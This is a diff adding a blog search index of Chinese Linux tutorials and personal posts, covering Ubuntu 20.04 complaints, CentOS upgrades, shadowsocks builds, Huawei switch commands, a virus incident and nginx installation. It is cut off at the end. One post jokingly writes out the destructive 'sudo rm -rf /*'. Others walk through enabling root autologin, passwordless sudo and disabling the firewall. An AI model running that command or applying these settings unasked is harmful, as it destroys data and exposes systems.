@@ -1,0 +1,682 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search> 
+  
+  
+    
+    <entry>
+      <title>体验ubuntu20.04的使用感受</title>
+      <link href="/2020/05/15/2020-05-16-%E4%BD%93%E9%AA%8Cubuntu20.04%E7%9A%84%E4%BD%BF%E7%94%A8%E6%84%9F%E5%8F%97/"/>
+      <url>/2020/05/15/2020-05-16-%E4%BD%93%E9%AA%8Cubuntu20.04%E7%9A%84%E4%BD%BF%E7%94%A8%E6%84%9F%E5%8F%97/</url>
+      
+        <content type="html"><![CDATA[<p>从ubuntu20.04 四月二十四日发布到现在，我使用了有二十来天了，今天就简单说下使用感受。我装的是win10与ubuntu双系统。</p><a id="more"></a><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>界面新鲜且好看</p><p>你没看错，就一条优点而已</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ol><li><p>驱动是个绝对硬伤，所有驱动都是兼容性驱动，勉强能用，但效果不理想。</p></li><li><p>时而会有花屏现象。</p></li><li><p>我连的是蓝牙鼠标，会经常卡一下。</p></li><li><p>声音就是听个响，音质实在不敢恭维。</p></li><li><p>屏幕亮度也是个硬伤，每次开机都是恢复到一个亮度，偏亮，不能记录亮度，日志天天报错：Failed to get backlight or LED device ‘backlight:nvidia_0’: No such device</p></li><li><p>不会自动息屏，我已经设置了五分钟息屏，但没有用，屏幕会一直亮着。</p></li><li><p>程序经常卡死崩溃，实在是不稳定。</p></li><li><p>系统也不稳定，我都已经重装过一次系统了，因为gnome-shell频繁占用cpu 100%，但找不出是什么原因导致占用cpu100%的，只能重装了事。</p></li><li><p>自带的ibus输入法实在是难用的要命，我现在装的是谷歌拼音，因为搜狗还不兼容，装不了。</p></li><li><p>软件也是个绝对硬伤，更新慢，软件少，且有太多的软件还不兼容ubuntu20.04了，这是大多数用户望而却步的鸿沟了。</p></li><li><p>国产软件几乎都还不兼容20.04</p></li><li><p>点击左下角的显示应用程序按钮时，结果显示经常会有图标重叠现象，要再多点击一下才会正常，强迫症表示难受。</p></li><li><p>自带的软件商店真的是难用，绝对差评。</p></li><li><p>打开几个虚拟机就卡死，内存管理机制还是不够完善。</p></li><li><p>还有很多我没有列出来。。。</p></li></ol><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>实在是有太多缺点了，说都说不完，这系统给人的感觉就是个测试版的系统，不成熟且容易崩。bug多的数不过来。linux系统在服务器领域是个非常牛逼的存在，但在桌面领域还有很长的路要走。建议还是在虚拟机上尝试ubuntu20.04即可，在物理机上实在是太折腾了。还有，这么多缺点的系统我为什么还在用？因为我看中的是它的优点。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>linux 生成、查看文件的MD5、SHA、SHA256值</title>
+      <link href="/2020/05/11/2020-05-12-%E7%94%9F%E6%88%90%E3%80%81%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84MD5%E3%80%81SHA%E3%80%81SHA256%E5%80%BC/"/>
+      <url>/2020/05/11/2020-05-12-%E7%94%9F%E6%88%90%E3%80%81%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84MD5%E3%80%81SHA%E3%80%81SHA256%E5%80%BC/</url>
+      
+        <content type="html"><![CDATA[<p>Linux系统生成MD5、SHA、SHA256</p><p>md5sum filename  &gt;&gt; MD5.txt</p><p>sha1sum filename &gt;&gt; SHA1.txt</p><p>sha256sum filename &gt;&gt; SHA256.txt</p><a id="more"></a><p>Linux系统查看 MD5、SHA、SHA256</p><p>md5sum filename</p><p>sha1sum filename</p><p>sha256sum filename</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>centos7.7升级到centos7.8</title>
+      <link href="/2020/05/10/2020-05-11-centos7.7%E5%8D%87%E7%BA%A7%E5%88%B0centos7.8/"/>
+      <url>/2020/05/10/2020-05-11-centos7.7%E5%8D%87%E7%BA%A7%E5%88%B0centos7.8/</url>
+      
+        <content type="html"><![CDATA[<p>最近发布了CentOS7.8，算是常规更新吧，变化不大，我的服务器使用的是7.7，就打算升级到7.8  步骤如下。</p><a id="more"></a><h3 id="1-备份："><a href="#1-备份：" class="headerlink" title="1.备份："></a>1.备份：</h3><p>数据备份，带有任何不确定性操作之前都需要进行数据备份。</p><h3 id="2-查看系统版本："><a href="#2-查看系统版本：" class="headerlink" title="2.查看系统版本："></a>2.查看系统版本：</h3><p>cat /etc/redhat-release</p><h3 id="3-更新yum源"><a href="#3-更新yum源" class="headerlink" title="3.更新yum源"></a>3.更新yum源</h3><p>yum默认的镜像很慢，需要更新国内镜像</p><p>cd  /etc/yum.repos.d/    </p><p>wget <a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo" target="_blank" rel="noopener">http://mirrors.163.com/.help/CentOS7-Base-163.repo      </a></p><p>cp CentOS-Base.repo  CentOS-Base.repo.bak    </p><p>cp CentOS7-Base-163.repo   CentOS-Base.repo</p><h3 id="4-检查是否可更新到7-8"><a href="#4-检查是否可更新到7-8" class="headerlink" title="4.检查是否可更新到7.8"></a>4.检查是否可更新到7.8</h3><p>yum check-update  | grep centos-release </p><h3 id="5-更新"><a href="#5-更新" class="headerlink" title="5.更新"></a>5.更新</h3><p>sudo yum update</p><p>更新完成，会看到Complete!</p><h3 id="6-检查一下："><a href="#6-检查一下：" class="headerlink" title="6.检查一下："></a>6.检查一下：</h3><p>cat  /etc/redhat-release </p><h3 id="7-重启"><a href="#7-重启" class="headerlink" title="7.重启"></a>7.重启</h3><p>reboot</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ubuntu20.04设置普通用户sudo不用输密码</title>
+      <link href="/2020/05/09/2020-05-10-ubuntu20.04%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo%E4%B8%8D%E7%94%A8%E8%BE%93%E5%AF%86%E7%A0%81/"/>
+      <url>/2020/05/09/2020-05-10-ubuntu20.04%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo%E4%B8%8D%E7%94%A8%E8%BE%93%E5%AF%86%E7%A0%81/</url>
+      
+        <content type="html"><![CDATA[<p>现在很多的linux系统都禁止使用root用户登录了，在装系统的时候都强制要创办一个普通用户，虽然用意是为了系统安全，但使用过程中就遇到了一个问题，就是使用sudo的时候要频繁输入密码，实在是太麻烦了。</p><a id="more"></a><p><strong>一般解决方法有两种：</strong></p><h3 id="第一种方法：设置root用户自动登录"><a href="#第一种方法：设置root用户自动登录" class="headerlink" title="第一种方法：设置root用户自动登录"></a>第一种方法：设置root用户自动登录</h3><p>这个确实是非常直接的解决办法，ubuntu20.04默认是禁止使用root用户登录，但我们可以手动设置root用户登录，然后为所欲为。其设置过程也不难，linux系统是开源的，系统的所有设置都可以修改，只要你开心，你修改内核也是可以的，甚至一兴奋执行sudo rm -rf /* 也是没人会拦你的，毕竟你的系统是真正的由你做主的，当然咯，在自己的电脑上才可以这么任性，在生产环境就得以安全为主了。</p><p>设置方法：</p><h4 id="1-设置root密码"><a href="#1-设置root密码" class="headerlink" title="1.设置root密码"></a>1.设置root密码</h4><p><code>sudo passwd root</code></p><h4 id="2-设置50-unity-conf"><a href="#2-设置50-unity-conf" class="headerlink" title="2.设置50-unity.conf"></a>2.设置50-unity.conf</h4><p><code>sudo vim /usr/share/lightdm/lightdm.conf.d/50-unity.conf</code></p><pre><code class="bash">[Seat:*]user-session=ubuntuautologin-guest=falseautologin-user=rootautologin-user-timeout=0greeter-session=lightdm-gtk-greeter</code></pre><h4 id="3-修改-etc-pam-d-下文件"><a href="#3-修改-etc-pam-d-下文件" class="headerlink" title="3.修改/etc/pam.d/下文件"></a>3.修改/etc/pam.d/下文件</h4><p><code>sudo vim /etc/pam.d/gdm-autologin</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><p><code>sudo vim /etc/pam.d/gdm-password</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><p><code>sudo vim /etc/pam.d/gdm-fingerprint</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><h4 id="4-修改-root-profile文件"><a href="#4-修改-root-profile文件" class="headerlink" title="4.修改/root/.profile文件"></a>4.修改/root/.profile文件</h4><p><code>sudo vim /root/.profile</code><br> 文档最后一行 mesg n || true 前添加 tty -s &amp;&amp; 即 tty -s &amp;&amp;mesg n || true</p><h4 id="5-修改-etc-gdm3-custom-conf"><a href="#5-修改-etc-gdm3-custom-conf" class="headerlink" title="5.修改/etc/gdm3/custom.conf"></a>5.修改/etc/gdm3/custom.conf</h4><p><code>sudo vim /etc/gdm3/custom.conf</code></p><pre><code class="bash"># Enabling automatic loginAutomaticLoginEnable = trueAutomaticLogin = root</code></pre><p>这种方法有个弊端，出于安全原因，谷歌浏览器和VLC播放器无法使用了。谷歌浏览器只能在普通用户下使用，因为我是要使用谷歌浏览器的，所以我要妥协用回普通用户了。</p><h3 id="第二种方法：设置普通用户sudo不用输密码"><a href="#第二种方法：设置普通用户sudo不用输密码" class="headerlink" title="第二种方法：设置普通用户sudo不用输密码"></a>第二种方法：设置普通用户sudo不用输密码</h3><p>网络上有很多种方法，但不使用ubuntu20.04，后面才查到了这个方法，亲测有效。</p><p><code>sudo vim /etc/sudoers</code></p><pre><code class="bash">%sudo   ALL=(ALL:ALL) ALL   修改为  %sudo   ALL=(ALL:ALL) NOPASSWD:ALL</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> linux </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>ubuntu20.04 安装shadowsocks-qt5</title>
+      <link href="/2020/05/07/ubuntu20.04-%E5%AE%89%E8%A3%85shadowsocks-qt5/"/>
+      <url>/2020/05/07/ubuntu20.04-%E5%AE%89%E8%A3%85shadowsocks-qt5/</url>
+      
+        <content type="html"><![CDATA[<p>很多人不想用linux系统作为主用系统，最大的原因就是软件方面的问题，上手难度有点高，不像windows那样拿来就用。像ubuntu20.04这种最新的系统就更折腾了，很多软件都还没适配，实在是令人抓狂。网络上常见有三种方法安装shadowsocks-qt5，我都试过了，只有我现在要说的这种方法有效。</p><a id="more"></a><h3 id="第一种：（失败）"><a href="#第一种：（失败）" class="headerlink" title="第一种：（失败）"></a>第一种：（失败）</h3><pre><code>sudo add-apt-repository ppa:hzwhuang/ss-qt5         未兼容，添加失败。sudo apt-get update sudo apt-get install shadowsocks-qt5</code></pre><h3 id="第二种：（乱码）"><a href="#第二种：（乱码）" class="headerlink" title="第二种：（乱码）"></a>第二种：（乱码）</h3><p><code>sudo snap install shadowsocks-qt5</code>         系统为中文的话，安装完后会乱码</p><h3 id="第三种：（可行）"><a href="#第三种：（可行）" class="headerlink" title="第三种：（可行）"></a>第三种：（可行）</h3><h4 id="第一步：准备文件"><a href="#第一步：准备文件" class="headerlink" title="第一步：准备文件"></a>第一步：准备文件</h4><p><code>sudo apt-get install synaptic</code>    安装新立德包管理器，后面用的上<br><code>sudo apt-get install cmake qtbase5-dev libqrencode-dev libzbar0 libappindicator1 libzbar-dev</code>    安装相关依赖。</p><p><code>git clone https://github.com/shadowsocks/shadowsocks-qt5</code>    下载shadowsocks-qt5<br><code>git clone https://github.com/shadowsocks/libQtShadowsocks</code>    下载libQtShadowsocks<br><code>wget https://botan.randombit.net/releases/Botan-2.9.0.tgz</code>        下载Botan，具体最新版本可去查看一下，目前最新版本是2.9.0</p><h4 id="第二步：要按顺序安装"><a href="#第二步：要按顺序安装" class="headerlink" title="第二步：要按顺序安装"></a>第二步：要按顺序安装</h4><p>先安装Botan：</p><pre><code>tar xvf Botan-2.9.0.tgzcd Botan-2.9.0./configure.pymake -j4sudo make installsudo ldconfig</code></pre><p>再安装libQtShadowsocks ：</p><pre><code>cd libQtShadowsocks mkdir build &amp;&amp; cd buildcmake .. -DUSE_BOTAN2=ONmake -j4sudo make install</code></pre><p>最后安装shadowsocks-qt5：</p><pre><code>cd shadowsocks-qt5mkdir build &amp;&amp; cd buildcmake .. make -j4sudo make install</code></pre><p>安装完毕后，终端输入：ss-qt5  或者 点击图标来打开shadowsocks-qt5，如果能打开是最好的，我的就不能打开。<br>打不开的解决方法：<br>终端输入：<code>sudo apt install -f</code>    看看有没有缺失的依赖需要安装，如果没有就打开新立德包管理器，选择“推荐的软件包丢失“，刷新一下，这时候应该会出现一些包需要安装，右键选择“标记以便安装“，点击“应用“，安装完后应该就能打开了，我尝试了两次都能安装成功，如果你的不能成功就要找找原因了。或许步骤没做对，或者系统不兼容。</p><p>支持chacha20-ietf-poly1305协议</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> ubuntu </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>华为交换机常用查看指令</title>
+      <link href="/2020/04/30/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%9F%A5%E7%9C%8B%E6%8C%87%E4%BB%A4/"/>
+      <url>/2020/04/30/%E5%8D%8E%E4%B8%BA%E4%BA%A4%E6%8D%A2%E6%9C%BA%E5%B8%B8%E7%94%A8%E6%9F%A5%E7%9C%8B%E6%8C%87%E4%BB%A4/</url>
+      
+        <content type="html"><![CDATA[<p>display version，显示系统版本。</p><p>display clock [ utc ]，显示系统时钟。</p><p>display saved-configuration，显示起始配置信息。</p><p>display current-configuration，显示当前配置信息。</p><a id="more"></a><p>display this，显示当前视图的运行配置。</p><p>display user-interface  命令查看当前系统中的绝对编号。</p><p>display diagnostic-information [ file-name ]，显示系统诊断信息。</p><p>display users [ all ]命令显示用户界面的使用信息。</p><p>display user-interface console ui-number1 [ summary ]命令显示用户界面的物理属性和配置。</p><p>display local-user命令查看本地用户列表。</p><p>display access-user命令查看在线用户。</p><p>display users，可以查看当前用户界面的使用信息。</p><p>display ip interface [ brief ] [ interface-type [ interface-number ] ]命令查看接口的IP配置信息。</p><p>display interface [ interface-type [ interface-number ] ]命令查看接口的信息。</p><p>display interface brief 查看物理端口的物理状态</p><p>display arp all  查看整机所有单板ARP表项数量(已经去除重复的ARP表项)</p><p>display arp statistics all  该命令查询的是整机所有单板(主控板+接口板)的ARP表项数量</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>kali linux系统设置root用户自动登录解决方法</title>
+      <link href="/2020/04/02/kali%20linux%E8%AE%BE%E7%BD%AEroot%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
+      <url>/2020/04/02/kali%20linux%E8%AE%BE%E7%BD%AEroot%E7%94%A8%E6%88%B7%E8%87%AA%E5%8A%A8%E7%99%BB%E5%BD%95%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
+      
+        <content type="html"><![CDATA[<p>kali linux 2020版本其中有一个变动的地方就是不能再以root用户登录系统了，就是只能以普通用户身份登录，每次使用有很大的不方便，每次都要手动切换root用户，切换多了感觉就很繁琐，索性就设置默认以root用户登录，省事多了。当然在个人电脑才这么玩，如果是生产环境下的机器还是普通用户保险点。</p><a id="more"></a><h3 id="第一步：先给root用户设个密码"><a href="#第一步：先给root用户设个密码" class="headerlink" title="第一步：先给root用户设个密码"></a>第一步：先给root用户设个密码</h3><pre><code>$sudo passwd root输入密码：再次输入密码：</code></pre><h3 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h3><pre><code>sudo vim /etc/pam.d/gdm-autologin注释行 “auth requied pam_succeed_if.so user != root quiet success”</code></pre><pre><code>sudo vim /etc/pam.d/gdm-password注释行 “auth requied pam_succeed_if.so user != root quiet success”</code></pre><p><strong>到这一步便可以使用root用户登录了</strong></p><h3 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h3><pre><code>vim /etc/gdm3/daemon.conf</code></pre><pre><code>[daemon]# Uncomment the line below to force the login screen to use Xorg#WaylandEnable=false# Enabling automatic login  AutomaticLoginEnable = true    **#改成true**  AutomaticLogin = root         **#改成root**# Enabling timed login#  TimedLoginEnable = true#  TimedLogin = user1#  TimedLoginDelay = 10#AutomaticLoginEnable=False#AutomaticLogin=kali     **#注释掉普通用户**</code></pre><h3 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h3><pre><code>vim /etc/lightdm/lightdm.confautologin-user=root</code></pre><h3 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h3><p>重启系统：reboot</p><p><strong>开机之后便会自动以root用户登录系统了，密码都不用输，简直是懒癌的福音。</strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电脑中病毒</title>
+      <link href="/2020/02/11/%E7%94%B5%E8%84%91%E4%B8%AD%E7%97%85%E6%AF%92/"/>
+      <url>/2020/02/11/%E7%94%B5%E8%84%91%E4%B8%AD%E7%97%85%E6%AF%92/</url>
+      
+        <content type="html"><![CDATA[<p>今天遇到了一件有意思的事情，上班时我发现有一台工作电脑屏幕上弹出一个很大界面的广告，本来因为有很多电脑乱安装软件或者安装不规范，导致会安装了一些流氓软件或者捆绑了很多不必要的垃圾软件，从而产生弹广告这些见怪不怪的事情了。由于屏幕上运行着监控软件，这个界面很大的广告几乎完全挡住监控界面了。这时候我必须要去关闭它了，不然看不到监控界面了。关闭的时候我还在感慨：现在的流氓软件真是太猖狂了，搞个广告都喜欢弄个这么大的。平时看到的弹广告都是电脑桌面右下角那里弹个小小的广告界面。我当时还觉得有点新鲜，还想随手拍个照片留底一下，后面想了想貌似之前双十一的时候也看过不少这么大的广告界面了，就懒得的拍照了，随手就点击关闭按钮。</p><a id="more"></a><p>然而事情没有那么简单，过了不久又弹出了一样的广告出来，我心里有点不乐意了，心里暗暗骂道，太流氓了。我看到广告界面右上角有个倒三角符号，我就点击一下，弹出选择：一天内不弹出、一周内不弹出，永久不弹出。<br>我选择了永久不弹出，然后随手关闭了，之前遇到过一种广告，选择永久不弹出的话需要注册用户才行，现在这个广告不用注册就可以关闭了，对比一下还是挺良心的嘛，既然能够永久不弹出的话我就不去深究了，我本人是最痛恨流氓软件的，所以我的个人电脑上是看不到广告这个玩意的，我电脑上的软件都是精心挑选的。上班时我都是使用自己的个人电脑。</p><p>可事情还是没有那么的简单，过了不久广告又弹出来了，这下可激怒我了，虽然是工作上的电脑，但我也不能容忍流氓软件这么猖狂，我明明选择了永久不弹出，它还在不停的弹出，这就是挑衅，这就是真正意义上的耍流氓的软件，必须干掉它。</p><p>接下来好戏便开始了，我看了一下广告界面，看不出是哪个软件产生的广告，我关闭广告后，进入电脑桌面，发现桌面壁纸被删除了，只留下黑乎乎的电脑桌面背景和桌面上的图标，我心想这不正常，这电脑平时没什么人会用，不应该会有人设置这样的桌面背景。此时这个广告还在不停的弹出。我想看看最近是不是安装了什么新的流氓软件，我点击开始按钮，结果按了之后没有反应，这就更奇怪了，打开任务管理器，我一看，内存使用率达到99%，我仔细看看，没有看到占用内存高的进程，此时我就知道是中病毒了，病毒把进程隐藏了，有意思，这时候就需要安全软件登场了，电脑桌面按什么都没有反应，然后我看下任务栏有不显示程序的三角符号，如果这台电脑上有安全软件的话一定会自动开机运行的，我看了一下有个火绒的安全软件，这下可以扫描一下病毒了，结果点击了火绒之后没反应，反而火绒退出了，就这样消失在我的眼前，我心想，这火绒也太弱了吧，居然被病毒干掉了。</p><p>这时候只能重启系统了，按住ctrl+alt+del键，选择电源那里，选择重启，结果有个未知的程序跳出来阻止关机，没关系，这里选择仍然关机。系统开机之后，系统能正常运行了，虽然病毒会开机自动运行，但没那么快。我打开开始按钮搜索火绒，结果没有找到，原来火绒已经被这个病毒删掉了，这个病毒还是有两把刷子的。我就打开浏览器重新下载个火绒安装，我之所以还要下载火绒，是想看看火绒能不能解决这个病毒，毕竟我的个人电脑上也安装了火绒。在这里我要说一下，国内的安全软件我只用火绒，因为火绒真的干净，没有广告，体积小，我本来电脑是没有安装安全软件的，就用微软自带的安全软件。后面看到火绒这个软件，感觉挺良心的，就支持一下它，就安装了。不过我电脑到目前为止都没有中过任何病毒。言归正传，安装了火绒之后就开始进行安全扫描了，果不其然，很快就扫描出了两个木马病毒，我一看原来是金山的程序搞的，处理病毒之后，我立刻将电脑上跟金山有关的软件全部卸载了，并且对电脑进行深度安全检查，后面又扫描出16个危险文件，包括后门病毒。处理之后，我又对电脑进行安装补丁。</p><p>这是我第一次遇到电脑中病毒的事件，挺有意思的，以前我刚玩电脑时，我几乎把全世界的有名安全软件都装了一遍，但我电脑从来都没有中过毒，我后面就很少再安装安全软件了，本来只用微软自带的安全软件也足够了，可是发现，平时要玩一些破解软件时，破解程序都被微软自带的干掉了，有点不方便，就用火绒来替代自带的了。</p><p>说真的，一个企业做这种事情，感觉有点恶心。不过能写出病毒的人都是挺牛逼的。不说那么多了，我还有大把东西需要学习。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>centos系统设置笔记本盖下不休眠</title>
+      <link href="/2020/02/11/centos%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%B8%8B%E4%B8%8D%E4%BC%91%E7%9C%A0/"/>
+      <url>/2020/02/11/centos%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0%E6%9C%AC%E7%9B%96%E4%B8%8B%E4%B8%8D%E4%BC%91%E7%9C%A0/</url>
+      
+        <content type="html"><![CDATA[<p>安装了centos8.1系统之后出现了一个问题，就是无论多久不使用电脑，屏幕一直都是亮着的，并不会自动息屏，以前安装centos7的时候是会自动息屏的。因为centos8笔记本是用来做服务器的，都是远程使用的，屏幕都是用不上的，屏幕一直亮着很是碍眼。所以要设置成盖下盖子而不会休眠。</p><p>通过网络查询，终于找到了设置的方法：</p><a id="more"></a><p>systemd 处理某些电源相关的 ACPI事件，可以通过从 /etc/system/logind.conf以下选项进行配置：</p><p>动作包括：</p><p>HandlePowerKey：按下电源键后的动作</p><p>HandleSleepKey：按下挂起键后的动作</p><p>HandleHibernateKey: 按下休眠键后的动作</p><p>HandleLidSwitch：合上笔记本盖后待机</p><p>这些动作的值可以是 ignore（什么都不做） poweroff（关机） reboot（重新启动） halt（关机，和poweroff有什么区别，需要手动断开电源？） suspend（待机挂起） hibernate（休眠） 默认情况是，当我合上笔记本屏幕的时候，系统会待机。</p><p>如果我不想让系统在我合上笔记本的时候待机，怎么办呢？</p><p>用vim编辑器打开 /etc/systemd/logind.conf 去掉HandleLidSwitch前面的注释符号#，并把它的值从suspend修改为ignore or lock。</p><p>lock 仅锁屏，计算机继续工作</p><p>然后systemctl restart systemd-logind，使更改生效。再合上笔记本盖子，也不会待机了。</p><p>如果再想进入待机状态，可执行systemctl suspend。</p><p>原文链接：<a href="https://blog.csdn.net/nankys/article/details/86617948" target="_blank" rel="noopener">https://blog.csdn.net/nankys/article/details/86617948</a></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 教程 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 教程 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>解决frp无法开机启动的问题</title>
+      <link href="/2020/02/01/%E8%A7%A3%E5%86%B3frp%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/"/>
+      <url>/2020/02/01/%E8%A7%A3%E5%86%B3frp%E6%97%A0%E6%B3%95%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E7%9A%84%E9%97%AE%E9%A2%98/</url>
+      
+        <content type="html"><![CDATA[<p>由于现在疫情的情况，新年假期延长了，我的是二月十号才去上班，这段时间都是呆在家里，不是打游戏就是打桌球，好是枯燥的生活，最近我趁着无聊的时间，就把家里的笔记本重装了centos8.1的系统，之前是centos7.7的系统，主要我就是图个新而已，其实差别都不大。</p><a id="more"></a><p>安装了centos系统之后，必定紧接着就是安装配置frp，这样我才能在外地远程进去。但是我配置完后发现frp并不能开机启动，我很仔细的检查过配置文件frpc.ini的内容，还有 vim /lib/systemd/system/frpc.service<br>里面的内容，都是没有问题的，执行systemctl start frpc 也是可以正常启动。但就是每次重启系统后不能启动frp，让我好是迷惑啊。</p><p>其实有经验的朋友可能很轻易就能想到是防火墙的问题了，我后面开始排除故障原因的时候，就想到了这是新装的系统，防火墙firewalld是正常启动的，于是我就把firewalld关闭了，后面就正常了。我之所以关闭防火墙，而不选择在防火墙上开启相应的端口，主要是嫌麻烦，因为这是家里的一台普通电脑而已，没有重要的资料需要保护，讲白，就是用不上防火墙。所以就关闭一了百了。<br>在家时间长了，学习的欲望低了，好是颓废了，这样下去真的难受，心里感觉好不充实，假期这么长，用来学习是一件很好的事，可不知为什么，总是提不起学习的欲望。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 随笔 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 随笔 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>centos7编译安装nginx并设置开机启动</title>
+      <link href="/2020/01/12/centos7%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/"/>
+      <url>/2020/01/12/centos7%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85nginx%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Nginx的应用场景"><a href="#Nginx的应用场景" class="headerlink" title="Nginx的应用场景"></a>Nginx的应用场景</h2><p>(1).http服务器。Nginx是一个http服务可以独立提供http服务。可以做网页静态服务器。<br>(2).虚拟主机。可以实现在一台服务器虚拟出多个网站。例如个人网站使用的虚拟主机。<br>(3).反向代理，负载均衡。当网站的访问量达到一定程度后，单台服务器不能满足用户的请求时，需要用多台服务器集群可以使用nginx做反向代理。并且多台服务器可以平均分担负载，不会因为某台服务器负载高宕机而某台服务器闲置的情况。</p><a id="more"></a><h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><h3 id="1-检查并安装所需的依赖软件"><a href="#1-检查并安装所需的依赖软件" class="headerlink" title="1.检查并安装所需的依赖软件"></a>1.检查并安装所需的依赖软件</h3><p>(1).gcc:nginx编译依赖gcc环境<br>安装命令：<code>yum install gcc-c++</code></p><p>(2).pcre:(Perl Compatible Regular Expressions)是一个Perl库，包括perl兼容的正则表达式库。nginx的http模块使用pcre来解析正则表达式.<br>安装命令：<code>yum install -y pcre pcre-devel</code></p><p>(3).zlib：该库提供了很多种压缩和解压缩的方式，nginx使用zlib对http包的内容进行gzip。<br>安装命令：<code>yum install -y zlib zlib-devel</code></p><p>(4).openssl:一个强大的安全套接字层密码库，囊括主要的密码算法、常用的密钥和证书封装管理功能及SSL协议，并提供丰富的应用程序供测试或其它目的使用。nginx不仅支持http协议，还支持https（即在ssl协议上传输http）.<br>安装命令：<code>yum install -y openssl openssl-devel</code></p><h3 id="2-下载nginx源码包"><a href="#2-下载nginx源码包" class="headerlink" title="2.下载nginx源码包"></a>2.下载nginx源码包</h3><p>下载命令：<code>wget http://nginx.org/download/nginx-1.17.7.tar.gz</code></p><h3 id="3-解压缩源码包并进入"><a href="#3-解压缩源码包并进入" class="headerlink" title="3.解压缩源码包并进入"></a>3.解压缩源码包并进入</h3><p>(1).解压缩：<code>tar -zxvf nginx-1.17.7.tar.gz</code></p><p>(2).进入解压缩后文件夹：<code>cd nginx-1.17.7</code></p><h3 id="4-配置编译参数命令-可以使用-configure-–help查询详细参数"><a href="#4-配置编译参数命令-可以使用-configure-–help查询详细参数" class="headerlink" title="4.配置编译参数命令:(可以使用./configure –help查询详细参数)"></a>4.配置编译参数命令:(可以使用./configure –help查询详细参数)</h3><pre><code class="jboss-cli">./configure</code></pre><p>注：安装之前需要手动创建上面指定的nginx文件夹，即/var/temp、/var/temp/nginx、/var/run/nginx文件夹，否则启动时报错</p><h3 id="5-编译并安装"><a href="#5-编译并安装" class="headerlink" title="5.编译并安装"></a>5.编译并安装</h3><p>命令：<code>make &amp;&amp; make install</code><br>可以进入/usr/local/nginx查看文件是否存在conf、sbin、html文件夹，若存在则安装成功</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 